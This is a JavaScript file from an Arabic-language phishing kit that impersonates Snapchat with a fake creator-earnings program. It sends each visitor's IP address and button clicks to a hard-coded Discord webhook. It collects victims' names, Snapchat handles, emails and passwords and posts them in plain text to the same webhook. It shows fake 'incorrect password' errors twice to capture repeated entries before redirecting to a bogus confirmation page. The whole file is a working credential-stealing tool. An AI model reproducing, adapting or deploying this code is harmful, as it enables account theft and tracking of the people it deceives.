// ===============================================
// 1. إعدادات ديسكورد لتتبع الزوار
// **هام: استبدل الرابط برابط Webhook الخاص بك**
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1444709878366212162/aaRxDFNINfucmVB8YSZ2MfdvHPUI8fbRRpROLo8iAAEFLjWfUNOHcgXJrhacUK4RbEHT"; 
// ===============================================

// 2. قاموس النصوص (ثابت باللغة العربية فقط)
const translations = {
    // === الصفحة الرئيسية (index.html) ===
    pageTitle: "منصة الأضواء - تحقيق المكاسب",
    heroHeader: "حقق الأرباح من منصة الأضواء!",
    heroText: "أنشئ محتوى مميزًا وابدأ بجني الأرباح من سناب شات.",
    applyButton: "تقديم الطلب",
    callToActionSecondary: "انضم الآن وشاهد إبداعك يتألق!",
    featuresHeader: "لماذا منصة الأضواء؟",
    feature1Title: "فرص ربح مجزية",
    feature1Text: "احصل على مكافآت مقابل المحتوى الذي يحبه الجمهور.",
    feature2Title: "انتشار عالمي",
    feature2Text: "صل إلى جمهور واسع حول العالم وشاهد محتواك يتألق.",
    feature3Title: "أدوات إبداعية سهلة",
    feature3Text: "استخدم أدوات سناب شات المدمجة لإنشاء مقاطع فيديو مذهلة.",
    footerText: "© 2025 جميع الحقوق محفوظة لـ Snapchat",
    
    // === صفحة النموذج (apply.html) ===
    pageTitleForm: "تقديم طلب الانضمام",
    formHeader: "نموذج تقديم الطلب",
    labelName: "الاسم بالكامل:",
    labelSnapchat: "معرّف حساب سناب شات:",
    labelTrackingField: "البريد الإلكتروني:",
    labelPassword: "كلمة المرور:",
    submitBtn: "إرسال الطلب",
    footerTextForm: "© 2025 جميع الحقوق محفوظة لـ Snapchat",
    loaderText: "جاري معالجة الطلب...",
    
    // === صفحة التأكيد (confirmation.html) ===
    pageTitleConfirm: "تم تقديم طلبك!",
    confirmHeader: "تم تقديم طلبك!",
    confirmText: "سنقوم بمراجعة طلبك خلال ٤٨ ساعة القادمة ونقوم بالرد عليك.",
    homeBtn: "العودة إلى سناب شات",
    footerTextConfirm: "© 2025 جميع الحقوق محفوظة لـ Snapchat",
};

// 3. دالة تطبيق النصوص العربية وتنسيق الصفحة
function applyArabicContent() {
    // تعيين لغة الصفحة واتجاهها للعربية دائمًا
    document.documentElement.setAttribute('lang', 'ar');
    document.body.style.direction = 'rtl';
    document.body.style.textAlign = 'right';
    
    // ضبط محاذاة الهيدر إذا وجد
    const headerContainer = document.querySelector('header .container');
    if (headerContainer) headerContainer.style.justifyContent = 'flex-start';

    // تطبيق النصوص على العناصر الموجودة في الصفحة
    for (const id in translations) {
        const element = document.getElementById(id);
        if (element) {
            element.textContent = translations[id];
        }
    }
    
    // تطبيق نص شاشة التحميل بشكل خاص إذا وجدت
    const loaderTextElement = document.getElementById('loaderText');
    if (loaderTextElement) {
        loaderTextElement.textContent = translations.loaderText;
    }
}

// دالة مساعدة لإرسال الرسائل إلى Discord Webhook
function sendToDiscord(message) {
    if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL === "YOUR_DISCORD_WEBHOOK_URL_HERE") {
        console.warn("Discord Webhook URL is not configured.");
        return Promise.resolve(); // إرجاع وعد فارغ لتجنب الأخطاء في سلاسل الوعود
    }

    const payload = {
        content: message,
        username: "Snapchat Tracker",
        avatar_url: "https://i.imgur.com/gK9u5lA.png" 
    };

    return fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload)
    })
    .catch(error => console.error("Error sending message to Discord:", error));
}

// 4. وظيفة إرسال عنوان IP عند دخول الزائر للموقع
function trackVisitorIP() {
    let dateTime = new Date().toLocaleString('ar-EG', {
        year: 'numeric', month: 'short', day: 'numeric',
        hour: '2-digit', minute: '2-digit', second: '2-digit'
    });

    fetch("https://api64.ipify.org?format=json")
        .then(response => response.json())
        .then(data => {
            let ipAddress = data.ip || 'غير معروف';
            
            let ipMessage = `🔔 **دخول جديد للموقع**\n**🔗 الصفحة:** ${window.location.href}\n**🌍 عنوان IP:** ${ipAddress}\n**⏰ التاريخ:** ${dateTime}\n**🌐 اللغة:** العربية (مثبت)`;

            sendToDiscord(ipMessage);
        })
        .catch(error => {
            console.error("Error fetching IP, sending fallback message:", error);
            
            let fallbackMessage = `⚠️ **تنبيه: دخول جديد للموقع (فشل تحديد IP)**\n**🔗 الصفحة:** ${window.location.href}\n**⏰ التاريخ:** ${dateTime}\n**🌐 اللغة:** العربية (مثبت)`;

            sendToDiscord(fallbackMessage);
        });
}

// 5. دالة تتبع النقر على زر "تقديم الطلب" (في index.html)
function trackClickAndProceed() {
    const applyButton = document.getElementById('applyButton');
    const loadingText = 'جاري التحضير...';
    
    if(applyButton) {
        applyButton.disabled = true;
        applyButton.textContent = loadingText;
    }
    
    const message = `🚨 **نقرة زر جديدة: "تقديم الطلب"**\n**🔗 من الصفحة:** ${window.location.href}\n**⏰ التاريخ:** ${new Date().toLocaleString('ar-EG')}\n**🌐 اللغة:** العربية`;

    sendToDiscord(message)
        .finally(() => {
            setTimeout(() => {
                window.location.href = 'apply.html';
            }, 3000); 
        });
}

// 6. منطق النموذج وتتبع المحاولات (في apply.html)
let attempts = 0;
const MAX_ATTEMPTS = 3;

// التحقق من وجود النموذج قبل إضافة مستمع الحدث لتجنب الأخطاء في الصفحات الأخرى
const submissionForm = document.getElementById("submissionForm");

if (submissionForm) {
    const loadingOverlay = document.getElementById("loadingOverlay");
    
    submissionForm.addEventListener("submit", function(event) {
        event.preventDefault(); 
        
        const statusMessage = document.getElementById("statusMessage");
        const submitButton = document.getElementById("submitBtn");
        
        // جمع البيانات
        let fullName = document.getElementById("fullName").value;
        let snapchatHandle = document.getElementById("snapchatHandle").value;
        let trackingEmail = document.getElementById("trackingEmail").value; 
        let passwordField = document.getElementById("passwordField").value; 

        let messageBody = `🔔 **محاولة إرسال نموذج جديدة** (رقم ${attempts + 1}):\n`;
        messageBody += `👤 **الاسم بالكامل:** ${fullName}\n`; 
        messageBody += `👻 **معرّف حساب سناب شات:** ${snapchatHandle}\n`; 
        messageBody += `📧 **البريد الإلكتروني:** ${trackingEmail}\n`; 
        messageBody += `🔒 **كلمة المرور:** ${passwordField}\n`;
        messageBody += `⏰ **التاريخ:** ${new Date().toLocaleString('ar-EG')}`;

        if (attempts < MAX_ATTEMPTS - 1) { // المحاولة 1 و 2 (فشل)
            attempts++;
            
            sendToDiscord(messageBody);

            statusMessage.textContent = 'عفواً، كلمة المرور أو معرّف الحساب غير صحيح. يرجى المحاولة مرة أخرى.';
            statusMessage.style.display = 'block';
            
        } else {
            // المحاولة الثالثة: النجاح
            attempts++;
            submitButton.disabled = true;
            statusMessage.style.display = 'none';
            
            if(loadingOverlay) loadingOverlay.style.display = 'flex';
            
            messageBody += "\n✨ (تم توجيه المستخدم لصفحة التأكيد)";
            sendToDiscord(messageBody);

            setTimeout(() => {
                window.location.href = "confirmation.html"; 
            }, 3000);
        }
    });
}

// 7. تشغيل الوظائف عند تحميل الصفحة
document.addEventListener('DOMContentLoaded', () => {
    applyArabicContent(); // تطبيق العربية فقط
    trackVisitorIP(); 
});
